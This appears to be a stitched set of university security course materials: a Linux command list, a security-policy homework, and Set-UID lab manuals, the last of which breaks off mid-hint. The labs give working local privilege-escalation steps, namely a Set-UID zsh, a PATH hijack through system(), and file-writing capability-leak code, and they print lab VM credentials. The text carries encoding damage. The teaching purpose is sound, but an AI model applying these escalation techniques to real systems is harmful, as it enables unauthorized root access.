Linux Intro section. List of Useful commands This is not an exhaustive list of commands. But this list covers most of the commands which are regularly used. Note: Always use the command â€œmanâ€ to view a commandâ€™s manual pages. The commandâ€™s manual page gives a complete list of functional usage of a command. a alias Create an alias of a command apropos Search Help manual pages (man -k) apt-get Search for and install software packages (Debian/Ubuntu for Centos use yum) aptitude Search for and install software packages (Debian/Ubuntu) aspell Spell Checker awk Find and Replace text, database sort/validate/index b basename Strip directory and suffix from filenames bash GNU Bourne-Again SHell bc Arbitrary precision calculator language bg Send to background break Exit from a loop â€¢ builtin Run a shell builtin bzip2 Compress or decompress named file(s) SECURITY LAB - [SELECT DATE] 17 c cal Display a calendar case Conditionally perform a command cat Concatenate and print (display) the content of files cd Change Directory cfdisk Partition table manipulator for Linux chgrp Change group ownership chmod Change access permissions chown Change file owner and group chroot Run a command with a different root directory chkconfig System services (runlevel) cksum Print CRC checksum and byte counts clear Clear terminal screen cmp Compare two files comm Compare two sorted files line by line command Run a command - ignoring shell functions â€¢ continue Resume the next iteration of a loop â€¢ cp Copy one or more files to another location cron Daemon to execute scheduled commands crontab Schedule a command to run at a later time csplit Split a file into context -determined pieces cut Divide a file into several parts d date Display or change the date & time dc Desk Calculator dd Convert and copy a file, write disk headers, boot records ddrescue Data recovery tool declare Declare variables and give them attributes â€¢ df Display free disk space diff Display the differences between two files diff3 Show differences among three files dig DNS lookup dir Briefly list directory contents dircolors Colour setup for `ls' dirname Convert a full pathname to just a path dirs Display list of remembered directories dmesg Print kernel & driver messages du Estimate file space usage e echo Display message on screen â€¢ egrep Search file(s) for lines that match an extended expression eject Eject removable media enable Enable and disable builtin shell commands â€¢ env Environment variables ethtool Ethernet card settings eval Evaluate several commands/arguments exec Execute a command exit Exit the shell expect Automate arbitrary applications accessed over a terminal SECURITY LAB - [SELECT DATE] 18 expand Convert tabs to spaces export Set an environment variable expr Evaluate expressions f false Do nothing, unsuccessfully fdformat Low -level format a floppy disk fdisk Partition table manipulator for Linux fg Send job to foreground fgrep Search file(s) for lines that match a fixed string file Determine file type find Search for files that meet a desired criteria fmt Reformat paragraph text fold Wrap text to fit a specified width. for Expand words, and execute commands format Format disks or tapes free Display memory usage fsck File system consistency check and repair ftp File Transfer Protocol function Define Function Macros fuser Identify/kill the process that is accessing a file g gawk Find and Replace text within file(s) getopts Parse positional parameters grep Search file(s) for lines that match a given pattern groupadd Add a user security group groupdel Delete a group groupmod Modify a group groups Print group names a user is in gzip Compress or decompress named file(s) h hash Remember the full pathname of a name argument head Output the first part of file(s) help Display help for a built -in command â€¢ history Command History hostname Print or set system name i iconv Convert the character set of a file id Print user and group id's if Conditionally perform a command ifconfig Configure a network interface ifdown Stop a network interface ifup Start a network interface up import Capture an X server screen and save the image to file install Copy files and set attributes j jobs List active jobs â€¢ join Join lines on a common field k kill Stop a process from running SECURITY LAB - [SELECT DATE] 19 killall Kill processes by name l less Display output one screen at a time let Perform arithmetic on shell variables â€¢ link Create a link to a file ln Create a symbolic link to a file local Create variables â€¢ locate Find files logname Print current login name logout Exit a login shell â€¢ look Display lines beginning with a given string lpc Line printer control program lpr Off line print lprint Print a file lprintd Abort a print job lprintq List the print queue lprm Remove jobs from the print queue ls List information about file(s) lsof List open files m make Recompile a group of programs man Help manual mkdir Create new folder(s) mkfifo Make FIFOs (named pipes) mkisofs Create an hybrid ISO9660/JOLIET/HFS filesystem mknod Make block or character special files more Display output one screen at a time mount Mount a file system mtools Manipulate MS -DOS files mtr Network diagnostics (traceroute/ping) mv Move or rename files or directories mmv Mass Move and rename (files) n netstat Networking information nice Set the priority of a command or job nl Number lines and write files nohup Run a command immune to hangups notify -send Send desktop notifications nslookup Query Internet name servers interactively o open Open a file in its default application op Operator access p passwd Modify a user password paste Merge lines of files pathchk Check file name portability ping Test a network connection pkill Stop processes from running popd Restore the previous value of the current directory SECURITY LAB - [SELECT DATE] 20 pr Prepare files for printing printcap Printer capability database printenv Print environment variables printf Format and print data â€¢ ps Process status pushd Save and then change the current directory pv Monitor the progress of data through a pipe pwd Print Working Directory q quota Display disk usage and limits quotacheck Scan a file system for disk usage quotactl Set disk quotas r ram ram disk device rcp Copy files between two machines read Read a line from standard input â€¢ readarray Read from stdin into an array variable â€¢ readonly Mark variables/functions as readonly reboot Reboot the syst"
m rename Rename files renice Alter priority of running processes remsync Synchronize remote files via email return Exit a shell function rev Reverse lines of a file rm Remove files rmdir Remove folder(s) rsync Remote file copy (Synchronize file trees) s screen Multiplex terminal,"run remote shells via ssh scp Secure copy (remote file copy) sdiff Merge two files interactively sed Stream Editor select Accept keyboard input seq Print numeric sequences set Manipulate shell variables and functions sftp Secure File Transfer Program shift Shift positional parameters shopt Shell Options shutdown Shutdown or restart linux sleep Delay fo""",,
INTRO TO COMPUTER SECURITY,3550,Security Policies,"Homework 3 Due: 11:59 PM on Tuesday, March 1, 2022 Form of submission: PDF, Word, or Text Document in Canvas Chapters 4 to 7 â€“ Security Policies (Introduction to Computer Security, Bishop) â¦ (20 Points) Consider a computer system that provides protection using the Bell-LaPadula policy. How would a virus spread if: â¦ the virus were placed on the system at system low (the compartment that all other compartments dominate)? â¦ the virus were placed on the system at system high (the compartment that dominates all other compartments)? â¦ (20 points) Construct the following lattices: â¦ A Bell-LaPadula lattice consisting of two secrecy levels (Unclassified and Confidential, where Unclassified < Confidential) and two categories (Hertz and Avis). The highest secrecy node should be the upper bound of the lattice. Regarding categories, the categories are defined to be separate organizations in which confinement of data to be desired. For example, a person with only Confidential rights in Hertz would not have access to even Unclassified data in Avis. Of course, you could have people with rights in both categories as well as objects that belong to both categories. â¦ A Biba lattice consisting of two integrity levels (High and Low) and two categories (Ford and GM). The highest integrity node should be the upper bound of the lattice. â¦ (15 points) Consider a system that combines the Military security policy and Bell-LaPadula confidentiality model. Given the security levels TOP SECRET, SECRET, CONFIDENTIAL, and UNCLASSIFIED (ordered from highest to lowest), and compartments Students, Faculty, Staff, and Contractors specify what type of access (read, write, both, none) is allowed in each of the following situations. â¦ John, cleared for (TOP SECRET, {Faculty, Staff, Students}), wants to access a document classified as (TOP SECRET, {Faculty, Staff, Contractors}). â¦ Bill, cleared for (CONFIDENTIAL, {Faculty, Students}), wants to access a document classified as (CONFIDENTIAL, {Students}) â¦ Janet, cleared for (SECRET, {Faculty, Students}), wants to access document classified as (CONFIDENTIAL, {Faculty}). â¦ Pete, cleared for (CONFIDENTIAL, {Faculty, Staff}), wants to access a document classified as (SECRET, {Staff}). â¦ Chris, cleared for (CONFIDENTIAL, {Staff}) wants to access a document classified as (UNCLASSIFIED, {Staff}). â¦ (15 points) The conflict class ""Airlines"" contains the following company groups: Delta, United Airlines, American Airlines, and US Airways. The second conflict class ""Hotels"" contains the company groups: Holiday Inn, Inter Continental, Best Western, and Double Tree. Would the following scenarios be allowed under what conditions using the Chinese Wall security policy with regards to the type of access (read, write, both, none)? â¦ Tom has had access to Delta company group. Tom wants to get access to United Airlines company group. â¦ Bob has had access to Delta. Bob wants to get access to Holiday Inn company group. â¦ Jim wants to get access to Delta and United Airlines company groups. â¦ John wants to get access to Delta and Inter Continental company groups. â¦ A new hire, Ann, wants to get access to Double Tree company group. â¦ (16 points) Consider the following lattice of security labels in which all data is labeled with one of the following four security labels (the higher the label, the more confidential the information): Consider the following program snippet that calculates the results for output variables a, b, c, and d based on the values of input variables q, r, s, and t: â€¦ a = s + t; if (q > 0) { b = 1; if (r > 0) { c = 1; } } else { d = 1; } â€¦ The input variables are initially assigned the following security labels (and cannot be changed): â¦ Label of q = Restricted (R) â¦ Label of r = Secret (S) â¦ Label of s = Confidential (C) â¦ Label of t = Public (P) For each output variables a, b, c, and d, determine the minimal security label that can be assigned so that the code shown is secure according to the Bell-LaPadula model. To give you a good start, you are really only concerned with the ""reads"" and ""writes"", specifically with regard to up and down according to the model. You may assume that all output variables are initially set to the Public security label and that discretionary read/write access is available where applicable. You must justify your results for full credit. â¦ (14 points) Suppose you are designing a high integrity system. Which integrity model (Biba or Clark-Wilson) would you select to provide the best guidance? Justify your answer."
INTRO TO COMPUTER SECURITY,5550,Set-UID Vulnerabilities 1,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: Set-UID Vulnerabilities Lab 3b: Set-UID Vulnerabilities In this lab, you will be using the same Ubuntu 20 VM as in Lab 3a. The credentials are: Username: sec-lab Password: untccdc NOTE: Address all the questions (Q1, Q2, etc.) marked in bold. When a screenshot is requested, try to fit all the results in one image. If this is not possible, then attach multiple screenshots. When a question is asked, e.g. â€œWho is the owner of the file?â€, type your answer, do not simply provide a screenshot. IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. Introduction Set-UID is an important security mechanism in Unix operating systems. When a Set-UID program (executable) is run, it assumes the owner's privileges. For example, if the program's owner is root, then it gains the root's privileges during its execution, no matter who runs it. Set-UID allows ordinary users to gain access to many important functionalities, but unfortunately, it is also the source of many vulnerabilities. The objectives of this lab are to let the students: (1) Appreciate its positive side: to understand why Set-UID is needed and how it is implemented. (2) Become aware of its negative side: to understand potential security problems that it may cause. Note: This is an exploration lab. Your main task is to â€œplayâ€ with the Set-UID mechanism in Linux. Please refer to the Lab 0 manual for the basic Linux commands. For information on working with umask, see, e.g., the following: https://www.linuxnix.com/umask-define-linuxunix/ Q1: Answer why passwd, chsh, su, and sudo commands need to be Set-UID programs. What will happen if they are not? Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: Set-UID Vulnerabilities Note: If you are not familiar with these commands, you should first learn about them by reading their manuals (e.g., man su, man chsh, etc.). Section 1: Shell Protection Mechanism In this section, you will run several Set-UID shell programs in Linux, and then describe and explain your observations. a. Login as root. 1. apt-get update 2. apt-get install zsh 3. Copy /bin/zsh to /tmp: cp /bin/zsh /tmp and make the copied file \tmp\zsh a Set-UID program with permission 4755: chmod 4755 4. cd /tmp 5. ls -la // to see the permission change b. Add a new user. 1. adduser bob 2. Enter your password. 3. Next, enter the password of the new user â€œbobâ€, after pressing â€œEnterâ€, complete the user details. 4. su bob c. Then login as a normal user, and run the Z shell (zsh). 1. ./zsh // this is to run the â€œzshâ€ shell Notice: the hostname is now â€œubuntuâ€ or â€œunt-secâ€ 2. pwd // see that your current folder; it to should be /tmp 3. cd /root // change directory to the â€œrootâ€ folder 4. pwd // notice that you entered the â€œrootâ€ folder while you are not root, // i.e., you have superuser privileges 5. exit // to leave the Z shell d. Perform the same steps as in the above Item (a) for bash: Instead of copying /bin/zsh, copy /bin/bash to /tmp. Make it a setuid program with permission 4755. Run /tmp/bash as a normal user. Try to change to the root directory. Q2: Can you get access to the root privilege? Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: Set-UID Vulnerabilities As you (hopefully) saw in the previous step, the bash shell has a built-in protection which prevents an abuse of the Set-UID mechanism. Basically, if bash detects that it is executed in a Set-UID process, it changes its effective user ID to the processâ€™ real user ID, hence dropping the privileges. In order to understand the issues, which arise when such the protection is not implemented, we are going to use a different shell program called /bin/zsh. In some Linux distributions (such as Fedora and Ubuntu), /bin/sh is actually a symbolic link to /bin/bash. In the following section, we will intentionally use the vulnerable Z shell. For that, we need to link the default shell /bin/sh to /bin/zsh using the following instructions: â€¢ sudo su (enter the root password) â€¢ cd /bin â€¢ rm -rf sh // to remove the original sh shell â€¢ ln -s zsh sh // to create a symbolic link of the vulnerable zsh shell to be sh. Q3: Attach a screenshot of the result. Section 2: PATH Environment Variable The â€œsystemâ€ (const char *cmd) library function can be used to execute a command within a program. The way â€œsystemâ€ works is to invoke the default shell (/bin/sh) program, and then let the shell program execute the command â€œcmdâ€. Since the shell program is invoked, calling system() within a Set-UID program is dangerous, because behavior of the shell program can be affected, e.g., by environment variables, such as PATH. The problem is that these environment variables are under userâ€™s control. By changing them, attackers (malicious users) can control behavior of Set-UID programs. One can change the PATH environment variable in the following way (this example adds the directory /home/sec-lab to the beginning of the PATH environment variable): â€¢ export PATH=/home/sec-lab:$PATH The Set-UID program below is supposed to execute the â€œlsâ€ command (absolute path: /bin/ls). However, let us see what happens if the programmer uses the relative path for the â€œlsâ€ command, rather than the absolute path. A. Create a file: a) nano setUID.c b) copy the following code to the file: #include <stdio.h > int main() { system(""ls""); return 0; } Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: Set-UID Vulnerabilities c) gcc -o setUID setUID.c // This is to compile the code. Q4: Attach a screenshot of the result. d) sudo chmod 4755 setUID e) ./setUID // Execute the file. Q5: Attach a screenshot of the result. (Notice the output.) Next, we will use the setUID executable to let a regular user â€œsec-labâ€ get access to the root shell. Note: Make sure that you are running the following steps as a user â€œsec-labâ€. First, we copy the shell program /bin/sh to our home directory /home/sec-lab/ also renaming it as â€œlsâ€: f) cp /bin/sh /home/sec-lab/ls Run setUID again: g) ./setUID As you can see, we got the root shell. Let us confirm it by accessing the root directory: h) cd /root Q6: Attach a screenshot of the result. Explain why you were able to get the root shell. i) Now, change the default shell /bin/sh so it points back to /bin/bash. (You will need to use â€œsudoâ€ to make changes to the â€œ/binâ€ directory.) cd /bin/ rm -rf sh ln -s bash sh j) Repeat the above steps (f)-(h). Q7: Attach a screenshot of the result. Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: Set-UID Vulnerabilities Section 3: Capability leaking To be more secure, Set-UID programs usually call setuid() system call to permanently relinquish their root privileges. However, sometimes, this is not enough. When a privileged process transitions to a non-privileged process, one of the common problems that may occur is the so called â€œcapability leakingâ€. Suppose that the process gained some capabilities when it was privileged. When the privileges are downgraded, if the program does not properly clean up these capabilities, they may still be accessible by the non-privileged processes. For example, after a file is opened, its file descriptor is created, and the latter represents a form of capability, because whoever carries it is able of accessing the corresponding file. Suppose that a program relinquishes the processâ€™ capability by calling setuid(), but â€œforgetsâ€ to close the file. Then, its descriptor represents a â€œleakedâ€ capability. NOTE: Before starting to work on this task, make sure that /bin/sh is linked to /bin/zsh: â€¢ cd /bin/ â€¢ rm â€“rf sh â€¢ ln -s zsh sh Assume that /etc/zzz is an important system file, and it is owned by root with permission 0644. Compile the following program, and make it set-root-uid. â€¢ Login as root using â€œsudo suâ€. â€¢ touch /etc/zzz â€¢ echo â€œImportant Configurationâ€ > /etc/zzz â€¢ Copy-paste your program into a file hack2.c (see its source below). â€¢ gcc -o hack2 hack2.c â€¢ chmod 4755 hack2 â€¢ exit // Make sure that you are now a normal user. â€¢ ./hack2 // When executing the code, you should be a normal user. â€¢ cat /etc/zzz Q8: Provide a screenshot of the results. Was the file /etc/zzz modified or not? Explain your observations. #include <stdio.h> #include <stdlib.h> Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: Set-UID Vulnerabilities #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> void main() { int fd; fd = open(""/etc/zzz"", O_RDWR | O_APPEND); if (fd == -1) { printf(""Cannot open /etc/zzz\n""); exit(0); } /* Simulate the tasks conducted by the program */ sleep(1); /* After the task, the root privileges are no longer needed; it is time to relinquish the root privileges permanently. */ setuid(getuid()); /* getuid() returns the real uid */ if (fork()) { /* In the parent process */ close (fd); exit(0); } else { /* in the child process */ /* Now, assume that the child process is compromised, malicious attackers have injected the following statements into this process */ write (fd,""Malicious Data\n"", 15); close (fd); } } Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: Set-UID Vulnerabilities References Wenliang Du, â€œSet-UID Privileged Programsâ€ Lecture Notes of CIS/CSE 643: Computer Security, Syracuse University http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Set_UID.pdf The SET-UID man page http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Vulnerability/Set-UID/files/setuid.pdf How to write a SETUID Program http://nob.cs.ucdavis.edu/~bishop/secprog/1987-sproglogin.pdf Wenliang Du, â€œComputer & Internet Security â€“ A Hands-on Approachâ€, 2nd ed., 2019. Wenliang Du, Environment Variable and Set-UID Program Lab: https://seedsecuritylabs.org/Labs_20.04/Files/Environment_Variable_and_SetUID/Environment_Varia ble_and_SetUID.pdf"
INTRO TO COMPUTER SECURITY,3550,Set-UID Vulnerabilities 2,"Lab 3: Set-UID Vulnerabilities Lab This lab uses the Ubuntu 20.04 virtual machine (VM) as an OVA file cscelab.ova on Canvas. The credentials are as follows: Username: sec-lab Password: untccdc NOTE: For your lab report, you need to reply to questions that are marked in red. NOTE: Make sure that your hostname is your EUID with a â€˜labâ€™ suffix and for your default user, use your EUID. For example, assuming your EUID is ab1234, the computer name (hostname) would be ab1234lab and the user would be ab1234. When it is required to â€œattach a screenshotâ€, feel free to attach several screenshots if needed. If the screenshot requires your terminal and commands, you need to make sure that your hostname and username are clearly visible. â¦ Introduction â¦ Unix File Hierarchy The Unix/Linux file system is organized as a hierarchy with the root (/) directory at the highest level. Some typical Unix system directories are /usr, /bin, /sbin, /home, /var, /boot, /dev, /etc, and others. In the figure shown below, â€œuser1â€ and â€œuser2â€ are the subdirectories of the directory â€œhomeâ€, â€œhello.txtâ€ is a plain text file and â€œlink_helloâ€ is a link file that points to â€œhello.txtâ€. In order to access the file â€œ/test/temp/hello.txtâ€, the system begins its search from the root (/) directory, then â€œtestâ€ and â€œtempâ€ directories consecutively, and then finally it finds the file â€œhello.txtâ€. â¦ Ownership and Permissions Ownership of files in UNIX can be viewed in one of three ways: owner (creator), group or others (i.e., all the other users, apart from the owner and the group members). Using this simple notion of ownership, access to files can be controlled by associating a unique user ID (UID) and a group ID (GID) with twelve permission bits for each file. Typically, these bits are divided into three sets of three bits each, as well as three extra bits as shown in the table below. The values â€œrâ€, â€œwâ€ and â€œxâ€ stand for read, write and execute bits for each of the owner, group and others permissions. The values â€œsuâ€, â€œsgâ€ and â€œtâ€ stand for set_user_id, set_group_id and the sticky bit, respectively. These 4 sets of bits are often represented in their octal digits. For example, â€œ100 111 101 101â€ is represented as â€œ4755.â€ When the â€œsuâ€ bit is set, the UID of the process will be that of the owner of the file, no matter who executes the file. Similarly, if the â€œsgâ€ bit is set, the GID of the process will be that of the group. â¦ Lab Procedures â¦ Exercise 3.1: Setting up the file structure and the user space The objective of this exercise is to setup the file hierarchy structure and the user accounts that are required for the exercises in this section. The su command is used to switch users. NOTE: Ideally, after all the operations intended to be performed under the privileges of a user are completed, it is better to â€œexitâ€ from that user. However, for the purposes of the lab, su will be done repeatedly in order to train you to switch users. â¦ Login as root â¦ sudo su â¦ enter password when prompted. â¦ Now you are root, and the â€˜#â€™ prompt represents the root mode (while the prompt â€˜$â€™ represents the ordinary user mode). 2. Use useradd command to create two new users user1 and user2 (you can name them by your choice and follow that name in place of user1 and user2 in the document) as follows: â¦ useradd user1 -g users â¦ mkdir /home/user1 â¦ chown user1:users /home/user1 â¦ useradd user2 -g users â¦ mkdir /home/user2 â¦ chown user2:users /home/user2 Q1: Provide a screenshot of your commands 3. Use passwd command to set the password for the users you created (required in the case you want to log in). For convenience, set the passwords to be the same as the usernames. You need to retype the passwords and ignore password warnings: a. passwd user1 (your username) b. passwd user2 (your username) 4. Check user information with the id command. Note the uid, gid for each output. a. id user1 b. id user2 Q2: Provide a screenshot of your commands 5. Create directory structure a. mkdir /test b. mkdir /test/temp 6. Switch user roles as user1 and then back to root using the su command a. whoami b. sudo su user1 (check â€˜$â€™ indicate user mode) c. sudo su OR sudo su root (unable to switch root? You might want to add user11 to the sudoers file) 7. Create a new file as root user a. touch /home/user2/HelloWorld b. ls -l /home/user2/HelloWorld Q3: Who is its owner and what is its group? 8. Change group ownership as well as user ownership of the file a. chgrp users /home/user2/HelloWorld b. chown user2:users /home/user2/HelloWorld c. ls -l /home/user2/HelloWorld Q4: Who is its owner and what is its group? â¦ Exercise 3.2: Differences in File and Folder Permissions The objective of the following exercises is to see differences between file and folder (directory) permissions. The chmod command will be used to change the file and directory permissions to demonstrate these differences. 1. Observe the result of ls and cd commands a. cd / b. ls -l c. ls -al /home Q5: What are the directory permissions for user1, user2 and test directories? Provide a screenshot and explain. d. Switch to user1 using su user1 e. ls -al /home/user2 Q6: Can you list the directory? f. cd /home/user2 Q7: Can you change the directory? 2. Change directory permissions of user2 directory and try again as user1. a. sudo su root b. chmod 740 /home/user2 c. Repeat steps 1d to 1f Q8: Can you list or change the directory? d. sudo su root e. chmod 750 /home/user2 f. Repeat steps 1d to 1f Q9: Can you list or change the directory?) g. touch /home/user2/hello12.txt Q10: Can you create a new file?) h. sudo su root i. chmod 770 /home/user2 j. sudo su user1 k. Repeat step 2g. Q11: Can you create a new file? l. ls â€“l /home/user2 â¦ Exercise 3.3: Text files and link files Unix supports two kinds of link filesâ€”a hard link and a symbolic link. A hard link is a file with the actual address space of some ordinary fileâ€™s data blocks. A symbolic (or soft) link is just a reference to another file. It contains the pathname to some other file. It is basically a shortcut to a file, which is typically used to access it. (Similarly to shortcuts in Windows.) Unix supports two kinds of link filesâ€”a hard link and a symbolic link. A hard link is a file with the actual address space of some ordinary fileâ€™s data blocks. A symbolic (or soft) link is just aÂ reference to another file. It contains the pathname to some other file. It is basically a shortcut to a file, which is typically used to access it. (Similarly to shortcuts in Windows.) 1. In the /test/temp/ directory, as the root user, create a new text file (â€œhello.txtâ€) and fill it with some text. a. echo something > /test/temp/hello.txt 2. Create a link link_hello in the test folder pointing to hello.txt in the temp folder (refer to the file structure in the introduction of the file hierarchy). a. cd / b. ln -s /test/temp/hello.txt /test/link_hello Q12: Is there any difference in file permissions of link_hello and hello.txt? Explain why. Q13: cat /test/link_hello â€”what is the output? Explain. â¦ Exercise 3.4: Default file permissions and group access control Whenever a new file is created, a default set of permissions is assigned to it. Whatever the permissions are, the UNIX system allows a user to filter out unwanted permissions set by default. This default setting can be set by the user using the umask command. The command takes the permissions set during creation of file and performs a bitwise AND to the bitwise negation of the mask value. Some common umask values are 077 (only user has permissions), 022 (only owner can write), 002 (only owner and group members can write), etc. 1. In a terminal window, make sure you are the root user, otherwise switch back to the root user. 2. Use umask command to check the current mask permission and assign a new mask. a. umask Q14: What is the current mask? How is it interpreted? (try umask â€“S or the man pages) b. cd /test c. touch testmask1 d. ls -al e. What are the permissions of the file â€œtestmask1â€? f. umask 0077 g. touch testmask2 h. Now, what are the permissions of the file â€œtestmask2â€? Q15: What does it mean if the umask value is set to 0000? Explain in detail. Q16: The risks of setting the extra bits (i.e., assigning their value to â€œ1â€) will be covered in Exercise 3.5, which shows that the extra bits should not be set, in general. What should be the umask value to ensure that the extra bits cannot be set? â¦ Exercise 3.5: setuid bit, setgid bit and sticky bit As explained in the ownership and permission section, the highest three bits of the permission value of a file represent the setuid bit, setgid bit and the sticky bit. If the setuid bit is set then the uid will always be set to the owner of the file during execution. If the setuid bit is not set then the uid will be that of the user who executes the process. Similarly, if the setgid bit is set then the gid will be set to the group that owns the file during execution. If the setgid bit is not set then the gid will be that of the group that executes the process. The sticky bit lets only the owner of the file or directory (and in addition the root user) to delete or rename it. In the following exercise, the objective is to demonstrate how processes are affected when the setuid bit is set. The exercise must be begun with root privileges. a. which touch b. ls â€“l /bin/touch c. chmod 4755 /bin/touch d. ls â€“l /bin/touch e. ls â€“l /home/user2 f. chmod 700 /home/user2/HelloWorld g. ls â€“l /home/user2 (observe timestamp and permissions) h. sudo su user1 i. touch /home/user2/HelloWorld j. ls â€“l /home/user2 (observe timestamp, is it updated?) k. sudo su root l. chmod 0755 /bin/touch m. sudo su user1 n. touch /home/user2/HelloWorld Q17: Provide a screenshot of the commands (together if possible) Q18: Explain why permission is denied, even though previously allowed? â¦ RESTORE THE SYSTEM Below are the set of commands that you should issue to restore the system to its original form (commands No. 4 and 5 could take some time). â¦ sudo su root â¦ umask 0022 â¦ chmod 0755 /bin/touch â¦ userdel user1 â¦ userdel user2 â¦ rm â€“rf /home/user1 â¦ rm â€“rf /home/user2 â¦ rm â€“rf /test â¦ rm â€“rf /home/test/ Q19: Provide a screenshot of the commands (together if possible) â¦ Set-UID Program Vulnerability Set-UID is an important security mechanism in Unix operating systems. When a Set-UID program (executable) is run, it assumes the owner's privileges. For example, if the program's owner is root, then it gains the root's privileges during its execution, no matter who runs it. Set-UID allows ordinary users to gain access to many important functionalities, but unfortunately, it is also the source of many vulnerabilities. The objectives of this lab are to let the students: (1) Appreciate its positive side: to understand why Set-UID is needed and how it is implemented. (2) Become aware of its negative side: to understand potential security problems that it may cause. Lab Tasks: This is an exploration lab. Your main task is to â€œplayâ€ with the Set-UID mechanism in Linux. You are required to accomplish the following tasks in Linux: Note: Please refer to the Lab 1a manual for the basic Linux commands. For example, we assume that the students know that when the lab instructs to copy a file, the cp command should be used. For information on working with umask, see, e.g., the following: https://www.linuxnix.com/umask-define-linuxunix/ Q20: Figure out why ""passwd,"" ""chsh,"" ""su,"" and ""sudo"" commands need to be Set-UID programs. What will happen if they are not? If you are not familiar with these commands, you should first learn about them by reading their manuals (For example man su, man chsh, etc.). 2. Run Set-UID shell programs in Linux, then describe and explain your observations. a. Login as root (or become root). â¦ apt-get update â¦ apt-get install zsh â¦ Copy /bin/zsh to /tmp (cp /bin/zsh /tmp), and make it a set-root-uid program with permission 4755 (chmod 4755 zsh). â¦ cd /tmp â¦ ls â€“la //to see the permission change b. Add a new user. â¦ adduser bob (username of your choice) â¦ Enter your password. â¦ Next, enter the password of the new user â€œbobâ€ (username), after pressing Enter complete the user details. â¦ su bob (username) c. Then login as a normal user, and run /tmp/zsh. Will you get root privilege? â¦ ./zsh //this is to run the zsh Notice: the hostname is now â€œunt-secâ€. â¦ pwd //see that your current folder; it to should be /tmp â¦ cd /root //change directory to root folder â¦ pwd //notice that you entered the root folder while you are not root â¦ exit //to come out of the zsh shell d. Perform the same steps as in the above step (c) for bash: Instead of copying /bin/zsh, copy /bin/bash to /tmp. Make it a set-root-uid program with permission 4755. Run /tmp/bash as a normal user. Try to go to the root directory. Q21: Can you get access to the root privilege? Q22: Please describe and explain your observations when performing steps (c) and (d). 3. As you will see from the previous task, /bin/bash has a certain built-in protection that prevents abuse of the Set-UID mechanism. In order to understand the issues, which arise when such the protection is not implemented, we are going to use a different shell program called /bin/zsh. In some Linux distributions (such as Fedora and Ubuntu), /bin/sh is actually a symbolic link to /bin/bash. To use zsh, we need to link /bin/sh to /bin/zsh. The following instructions describe how to change the default shell to zsh. â¦ sudo su Password: (enter root password) â¦ cd /bin â¦ rm â€“rf sh //to remove the original sh shell â¦ ln -s zsh sh //to create a symbolic link of the vulnerable zsh shell to be sh. Q23: Provide a screenshot of your commands 4. The PATH environment variable: The system (const char *cmd) library function can be used to execute a command within a program. The way system (cmd) works is to invoke the /bin/sh program, and then let the shell program to execute cmd. Since the shell program is invoked, calling system() within a Set-UID program is extremely dangerous. This is because the actual behavior of the shell program can be affected by environment variables, such as PATH. These environment variables are under userâ€™s control. By changing these variables, attackers (malicious users) can control behavior of Set-UID programs. In bash, you can change the PATH environment variable in the following way (this example adds the directory /home/sec-lab to the beginning of the PATH environment variable): â¦ sudo su â¦ export PATH=/home/sec-lab:$PATH The Set-UID program below is supposed to execute the /bin/ls command; however, suppose that the programmer only uses the relative path for the ls command, rather than the absolute path: A. Create a file: make sure you are still in the bin folder (if not, then cd /bin) a) nano setUID.c b) copy the following code to the file: #include <stdio.h > int main() { system(""ls -la""); return 0; } c) gcc -o setUID setUID.c //this is to compile the c code. Q24: Give a screenshot. d) sudo chmod 4755 setUID e) ./setUID //to execute the executable file Q25: Show the output (screenshot). Notice the output. f) cd /usr/local/ g) ls â€“la Q26: Show the output (screenshot) Notice that the â€œbinâ€ folder is owned by root (normal users, processes and programs should not have direct access) and your program had access to it as it used the setUID. Q27: Can you let this Set-UID program (owned by root) run your code instead of /bin/ls? If you can, is your code running with the root privilege? Describe and explain your observations. â¦ Now, change /bin/sh so it points back to /bin/bash, and repeat the above attack. â¦ cd /bin/ â¦ rm â€“rf sh â¦ ln -s bash sh Q28: Can you still get the root privilege? Describe and explain your observations. 5. The difference between system() and execve(). NOTE: Before you work on this task, please make sure that /bin/sh is linked to /bin/zsh, using the following steps: â¦ cd /bin/ â¦ rm â€“rf sh â¦ ln -s zsh sh Q29: Provide a screenshot of your commands (together if possible). Background: Suppose that Bob works for an auditing agency, and he needs to investigate a company for a suspected fraud. For the investigation purpose, Bob needs to be able to read all the files in the companyâ€™s Unix system. At the same time, to protect the integrity of the system, Bob should not be able to modify any file. To achieve this goal, Vince, the superuser of the system, wrote a special set-root-uid program (see below), and then gave the executable permission to Bob. This program requires Bob to type a file name at the command line, and then it will run /bin/cat to display the specified file. Since the program is running as a root, it can display any file that Bob specifies. However, since the program has no write operations, Vince is sure that Bob cannot use this special program to modify any file. â¦ Create a file as root in /home/<user-name>/Desktop // Note: the /<user-name>/ should be replaced with your username (e.g., â€œsec-adminâ€). â¦ nano topSecretFile.txt â¦ Enter any text in the file. â¦ Create a file as a root user in /home/<user-name>/Desktop //Note: the /<user-name>/ should be replaced with your username (e.g., â€œsec-adminâ€). Copy-paste the below code to the file you created. â¦ nano hack.c â¦ Copy the below code to this file. #include <string.h> #include <stdio.h> #include <stdlib.h> int main(int argc, char *argv[]) { char *v[3]; if (argc < 2) { printf(""Please type a file name.\n""); return 1; } v[0] = ""/bin/cat""; v[1] = argv[1]; v[2] = 0; /* Set q = 0 for Question a, and q = 1 for Question b */ int q = 0; if (q == 0) { char *command = malloc(strlen(v[0]) + strlen(v[1]) + 2); sprintf(command,""%s %s"", v[0], v[1]); system(command); } else execve(v[0], v[1], 0); return 0 ; } Once you have copied and pasted the code compile it. a. gcc â€“o code hack.c b. ./code topSecretFile.txt The text file containing some secret information that you created earlier is passed as an argument in the command line. Q30: Provide a screenshot of your commands (together if possible). A. Set q = 0 in the program. This way, the program will use system() to invoke the command. Q31: Is this program safe? If you were Bob, can you compromise the integrity of the system? For example, can you delete any file without proper permissions? (Hint: Remember that system() actually invokes /bin/sh, and then runs 